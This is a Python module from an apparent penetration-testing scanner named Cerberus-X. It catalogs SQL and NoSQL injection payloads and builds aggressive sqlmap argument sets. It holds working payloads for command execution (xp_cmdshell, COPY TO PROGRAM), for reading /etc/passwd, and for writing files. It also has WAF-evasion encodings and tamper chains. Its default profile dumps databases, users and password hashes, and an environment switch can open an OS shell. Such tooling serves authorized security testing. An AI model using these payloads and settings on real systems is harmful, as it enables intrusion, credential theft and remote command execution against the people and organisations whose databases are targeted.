"""
SQL injection technique catalog and sqlmap strategy (authorized testing).

Maps classic in-band, OOB, DB-specific, blind, evasion, and exfil techniques
onto sqlmap flags and lightweight probe payloads used by Cerberus-X scanners.
Does not ship standalone exploit PoCs — execution goes through sqlmap / probes.
"""

from __future__ import annotations

import os
import random
from typing import Any, Dict, List, Optional, Sequence

# sqlmap technique letters: B boolean, E error, U union, S stacked, T time, Q inline
TECHNIQUE_ALL = "BEUSTQ"

# Category 4 — polyglot that works across many dialects
POLYGLOT_TRUE = "' OR '1'='1' -- "
POLYGLOT_TRUE_ALT = "\" OR \"1\"=\"1\" -- "
POLYGLOT_STACKED = "'; SELECT 1 -- "

# ----------------------------------------------------------------------
# Probe payloads (Category 1, 3, 5, 6) — for VulnerabilityScanner loops
# ----------------------------------------------------------------------

CLASSIC_UNION = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    "1 UNION SELECT 1,2,3-- ",
    "' UNION ALL SELECT NULL,NULL,NULL-- ",
]

CLASSIC_ERROR = [
    "' AND 1=CONVERT(int,(SELECT @@version))-- ",
    "' AND 1=CAST((SELECT version()) AS int)-- ",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- ",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- ",
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- ",
]

CLASSIC_BOOLEAN = [
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1-- ",
    "' AND 1=2-- ",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SUBSTRING(@@version,1,1)='M'-- ",
]

CLASSIC_TIME = [
    "' AND SLEEP(3)-- ",
    "1' AND SLEEP(3)-- ",
    "'; WAITFOR DELAY '0:0:3'-- ",
    "'; SELECT pg_sleep(3)-- ",
    "' AND BENCHMARK(5000000,SHA1('a'))-- ",
    "' AND DBMS_LOCK.SLEEP(3)-- ",
]

CLASSIC_CONDITIONAL_ERROR = [
    "' AND IF(1=1,1,(SELECT 1 UNION SELECT 2))-- ",
    "' AND CASE WHEN (1=1) THEN 1/0 ELSE 1 END-- ",
    "1 AND CASE WHEN (ASCII(SUBSTRING(@@version,1,1))>64) THEN 1/0 ELSE 1 END-- ",
]

MYSQL_PAYLOADS = [
    "' AND SLEEP(2)-- ",
    "' AND BENCHMARK(2000000,MD5(1))-- ",
    "' UNION SELECT NULL,table_name FROM information_schema.tables-- ",
    "' AND LOAD_FILE('/etc/passwd')-- ",
    "' INTO OUTFILE '/tmp/cerberus_out.txt'-- ",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(user())) USING utf8)))-- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
]

POSTGRES_PAYLOADS = [
    "'; SELECT pg_sleep(3)-- ",
    "' AND CAST(version() AS int)=1-- ",
    "'; COPY (SELECT '') TO PROGRAM 'id'-- ",
    "' AND pg_read_file('/etc/passwd') IS NOT NULL-- ",
    "' AND current_setting('data_directory') IS NOT NULL-- ",
]

MSSQL_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:3'-- ",
    "'; EXEC xp_cmdshell('whoami')-- ",
    "'; EXEC master..xp_dirtree '\\\\127.0.0.1\\share'-- ",
    "' AND 1=CONVERT(int,@@version)-- ",
    "'; SELECT db_name(), HOST_NAME(), @@VERSION-- ",
    "'; OPENROWSET('SQLOLEDB','','')-- ",
]

ORACLE_PAYLOADS = [
    "' AND DBMS_LOCK.SLEEP(3)=0-- ",
    "' || UTL_HTTP.REQUEST('http://127.0.0.1/') || '",
    "' AND SYS_CONTEXT('USERENV','SESSION_USER') IS NOT NULL-- ",
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- ",
]

BLIND_BIT = [
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- ",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>96-- ",
    "' AND (SELECT CASE WHEN ASCII(SUBSTRING(user(),1,1))>64 THEN SLEEP(2) ELSE 0 END)-- ",
    "' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(2),0)-- ",
]

EVASION_SQL = [
    "' OR/**/1=1-- ",
    "'/**/OR/**/1=1#",
    "'%09OR%091=1-- ",
    "'+OR+1=1-- ",
    "SeLeCt+1",
    "'%2527 OR 1=1-- ",
    "' OR 0x31=0x31-- ",
    "' OR 1&1=1-- ",
    "/*!50000SELECT*/ 1",
    "' OR EXISTS(SELECT 1)-- ",
]

NOSQL_PROBES: List[Any] = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$where": "1==1"},
    "' || '1'=='1",
    '{"$gt":""}',
    '["$ne"]=1',
]

DBMS_SQLMAP = {
    "mysql": "MySQL",
    "mariadb": "MySQL",
    "postgres": "PostgreSQL",
    "postgresql": "PostgreSQL",
    "mssql": "Microsoft SQL Server",
    "sqlserver": "Microsoft SQL Server",
    "oracle": "Oracle",
    "sqlite": "SQLite",
}


def list_techniques() -> Dict[str, List[str]]:
    return {
        "classic_inband": [
            "union",
            "error_based",
            "boolean_blind",
            "time_based",
            "conditional_error",
        ],
        "out_of_band": [
            "dns_exfil",
            "http_exfil",
            "smb_unc",
            "file_write",
        ],
        "database_specific": [
            "mysql",
            "postgresql",
            "mssql",
            "oracle",
        ],
        "advanced": [
            "second_order",
            "stacked_queries",
            "polyglot",
            "orm_bypass",
            "nosql",
            "order_by_injection",
        ],
        "blind_refinements": [
            "bit_by_bit",
            "binary_search",
            "conditional_response",
            "heavy_query",
            "oob_blind",
        ],
        "evasion": [
            "comment_based",
            "case_variation",
            "double_encoding",
            "hex_encoding",
            "whitespace_sub",
            "inline_mysql_comments",
            "multipart",
        ],
        "data_exfil": [
            "schema_enum",
            "db_discovery",
            "privilege_check",
            "hash_extract",
            "dump",
            "group_concat",
        ],
        "tool_execution": ["sqlmap", "nosql_probes"],
    }


def payloads_for_dbms(dbms: Optional[str]) -> List[str]:
    name = (dbms or "").lower()
    if name in {"mysql", "mariadb"}:
        return list(MYSQL_PAYLOADS)
    if name in {"postgres", "postgresql"}:
        return list(POSTGRES_PAYLOADS)
    if name in {"mssql", "sqlserver"}:
        return list(MSSQL_PAYLOADS)
    if name == "oracle":
        return list(ORACLE_PAYLOADS)
    return []


def nosql_probe_payloads() -> List[Any]:
    return list(NOSQL_PROBES)


def probe_payloads(
    dbms: Optional[str] = None, count: int = 24, *, evasive: bool = True
) -> List[str]:
    """Lightweight active probes spanning classic + blind + evasion."""
    pool: List[str] = []
    pool.extend(CLASSIC_UNION)
    pool.extend(CLASSIC_ERROR)
    pool.extend(CLASSIC_BOOLEAN)
    pool.extend(CLASSIC_TIME)
    pool.extend(CLASSIC_CONDITIONAL_ERROR)
    pool.extend(BLIND_BIT)
    pool.append(POLYGLOT_TRUE)
    pool.append(POLYGLOT_TRUE_ALT)
    pool.extend(payloads_for_dbms(dbms))
    if evasive:
        pool.extend(EVASION_SQL)
    # Prefer diversity then trim
    random.shuffle(pool)
    seen: set[str] = set()
    out: list[str] = []
    for p in pool:
        if p not in seen:
            seen.add(p)
            out.append(p)
        if len(out) >= count:
            break
    return out


def sqli_profile(
    level: str = "aggressive",
    *,
    dbms: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Return SQLi intensity settings.
    Levels: off, low, medium, high, aggressive.
    """
    normalized = (level or "aggressive").lower()
    if normalized in {"off", "none", "false", "0"}:
        return {
            "intensity": "off",
            "level": 1,
            "risk": 1,
            "technique": "BEU",
            "enumerate": False,
            "dump": False,
            "oob": False,
            "stacked": False,
            "dbms": dbms,
        }

    profiles = {
        "low": {
            "level": 2,
            "risk": 1,
            "technique": "BEU",
            "enumerate": False,
            "dump": False,
            "oob": False,
            "stacked": False,
            "crawl": 0,
            "threads": 1,
            "time_sec": 3,
        },
        "medium": {
            "level": 3,
            "risk": 2,
            "technique": "BEUST",
            "enumerate": True,
            "dump": False,
            "oob": False,
            "stacked": True,
            "crawl": 2,
            "threads": 2,
            "time_sec": 4,
            "forms": True,
        },
        "high": {
            "level": 4,
            "risk": 3,
            "technique": TECHNIQUE_ALL,
            "enumerate": True,
            "dump": True,
            "oob": True,
            "stacked": True,
            "crawl": 3,
            "threads": 3,
            "time_sec": 5,
            "forms": True,
            "passwords": True,
        },
        "aggressive": {
            "level": 5,
            "risk": 3,
            "technique": TECHNIQUE_ALL,
            "enumerate": True,
            "dump": True,
            "dump_all": False,  # opt-in via env — can be huge
            "oob": True,
            "stacked": True,
            "crawl": 3,
            "threads": 4,
            "time_sec": 5,
            "forms": True,
            "passwords": True,
            "privileges": True,
            "schema": True,
            "second_order": True,
            "file_read_probe": True,
            "os_shell": os.environ.get("CERBERUS_SQLMAP_OS_SHELL", "").lower()
            in {"1", "true", "yes", "on"},
        },
    }
    profile = dict(profiles.get(normalized, profiles["aggressive"]))
    profile["intensity"] = normalized if normalized in profiles else "aggressive"
    profile["dbms"] = dbms
    if os.environ.get("CERBERUS_SQLMAP_DUMP_ALL", "").lower() in {
        "1",
        "true",
        "yes",
        "on",
    }:
        profile["dump_all"] = True
    return profile


def _has_flag(args: Sequence[str], name: str) -> bool:
    prefix = f"{name}="
    return any(a == name or a.startswith(prefix) for a in args)


def _dns_domain() -> Optional[str]:
    return (os.environ.get("CERBERUS_SQLMAP_DNS_DOMAIN") or "").strip() or None


def _second_order_url() -> Optional[str]:
    return (os.environ.get("CERBERUS_SQLMAP_SECOND_ORDER") or "").strip() or None


def build_sqlmap_args(
    profile: Optional[Dict[str, Any]] = None,
    *,
    existing: Optional[Sequence[str]] = None,
    evasion: Optional[Dict[str, Any]] = None,
) -> List[str]:
    """
    Merge playbook/user args with aggressive technique flags.
    Never strips operator-supplied tampers/levels if already set.
    """
    profile = profile or sqli_profile("aggressive")
    if profile.get("intensity") == "off":
        return list(existing or ["--batch"])

    args = list(existing or [])
    if "--batch" not in args and "-b" not in args:
        args.insert(0, "--batch")

    def add(flag: str) -> None:
        if not _has_flag(args, flag.split("=", 1)[0]):
            args.append(flag)

    add(f"--level={int(profile.get('level') or 5)}")
    add(f"--risk={int(profile.get('risk') or 3)}")
    add(f"--technique={profile.get('technique') or TECHNIQUE_ALL}")
    add(f"--time-sec={int(profile.get('time_sec') or 5)}")

    if profile.get("forms"):
        add("--forms")
    crawl = int(profile.get("crawl") or 0)
    if crawl > 0:
        add(f"--crawl={crawl}")
    threads = int(profile.get("threads") or 1)
    if threads > 1:
        add(f"--threads={threads}")

    dbms = profile.get("dbms")
    if dbms:
        mapped = DBMS_SQLMAP.get(str(dbms).lower(), str(dbms))
        add(f"--dbms={mapped}")

    if profile.get("enumerate"):
        for flag in (
            "--current-user",
            "--current-db",
            "--is-dba",
            "--banner",
            "--hostname",
        ):
            add(flag)
    if profile.get("schema"):
        add("--schema")
    if profile.get("privileges"):
        add("--privileges")
        add("--roles")
    if profile.get("passwords"):
        add("--passwords")
        add("--users")
    if profile.get("dump_all"):
        add("--dump-all")
    elif profile.get("dump"):
        add("--dump")

    # OOB DNS (Category 2) when operator provides a catcher domain
    if profile.get("oob"):
        dns = _dns_domain()
        if dns:
            add(f"--dns-domain={dns}")

    if profile.get("second_order"):
        so = _second_order_url()
        if so:
            add(f"--second-order={so}")

    if profile.get("file_read_probe") and not _has_flag(args, "--file-read"):
        # Probe common path — sqlmap only fetches if FILE priv exists
        add("--file-read=/etc/passwd")

    if profile.get("os_shell"):
        add("--os-shell")

    # Evasion tampers from WAF module when requested
    evasion = evasion or {}
    if evasion.get("obfuscate_payloads") or profile.get("intensity") in {
        "high",
        "aggressive",
    }:
        if not any(str(a).startswith("--tamper") for a in args):
            try:
                from tools.waf_evasion import sqlmap_tamper_for_evasion

                args.extend(["--tamper", sqlmap_tamper_for_evasion(evasion)])
            except Exception:
                args.extend(
                    [
                        "--tamper",
                        "space2comment,randomcase,between,charencode,percentage",
                    ]
                )

    if evasion.get("parameter_pollution"):
        add("--hpp")

    # Prefer answers that keep going
    add("--answers=quit=N,follow=Y,crack=N,dict=N")

    return args


def follow_on_sqlmap_actions(
    *,
    dbms: Optional[str] = None,
    intensity: str = "aggressive",
) -> List[Dict[str, Any]]:
    """Decision-engine follow-ups once SQLi is confirmed."""
    profile = sqli_profile(intensity, dbms=dbms)
    base = build_sqlmap_args(profile, existing=["--batch", "--forms"])
    actions: List[Dict[str, Any]] = [
        {
            "tool": "sqlmap",
            "phase": "proof_of_impact",
            "stage": "aux",
            "finding_id": "sqli-enum",
            "args": [
                a
                for a in base
                if not a.startswith("--dump") and a != "--os-shell"
            ],
        },
        {
            "tool": "sqlmap",
            "phase": "proof_of_impact",
            "stage": "aux",
            "finding_id": "sqli-dump",
            "args": build_sqlmap_args(
                {**profile, "dump": True, "enumerate": True},
                existing=["--batch", "--forms", "--dump"],
            ),
        },
    ]
    if (dbms or "").lower() in {"mssql", "sqlserver"}:
        actions.append(
            {
                "tool": "sqlmap",
                "phase": "proof_of_impact",
                "stage": "aux",
                "finding_id": "sqli-mssql",
                "args": build_sqlmap_args(
                    sqli_profile(intensity, dbms="mssql"),
                    existing=["--batch", "--forms", "--technique=BEUSTQ"],
                ),
            }
        )
    return actions


def resolve_sqli_intensity(evasion: Optional[Dict[str, Any]] = None) -> str:
    """Map WAF evasion level / env to SQLi intensity."""
    env = (os.environ.get("CERBERUS_SQLI_INTENSITY") or "").strip().lower()
    if env:
        return env
    evasion = evasion or {}
    level = str(evasion.get("level") or "").lower()
    if level in {"aggressive", "high", "medium", "low", "off"}:
        return level
    return "aggressive"
